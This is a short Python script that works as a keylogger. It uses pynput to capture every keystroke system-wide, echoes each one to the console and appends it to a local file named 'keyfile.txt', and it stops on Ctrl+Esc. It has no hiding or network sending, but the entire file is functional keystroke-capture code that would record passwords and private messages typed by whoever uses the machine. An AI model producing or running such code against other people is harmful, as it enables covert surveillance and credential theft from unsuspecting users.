from pynput import keyboard

# Define the log file
LOG_FILE = "keyfile.txt"

# Initialize the pressed keys set
pressed_keys = set()

def keyPressed(key):
    try:
        # If the key has a char attribute, it's a regular key
        char = key.char
        if char:  # Ignore None values like special keys
            print(char)
            with open(LOG_FILE, 'a') as logkey:
                logkey.write(char)
    except AttributeError:
        # Handle special keys (like shift, ctrl, etc.)
        print(f"Special key pressed: {key}")
        with open(LOG_FILE, 'a') as logkey:
            logkey.write(f"[{key}]")

def on_press(key):
    global pressed_keys
    pressed_keys.add(key)
    keyPressed(key)

    # Check if both Ctrl and Esc are pressed
    if keyboard.Key.ctrl_l in pressed_keys and keyboard.Key.esc in pressed_keys:
        print("Ctrl + Esc pressed. Exiting...")
        return False  # Stops the listener

def on_release(key):
    global pressed_keys
    # Remove key from pressed_keys when it's released
    if key in pressed_keys:
        pressed_keys.remove(key)

if __name__ == "__main__":
    # Start the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
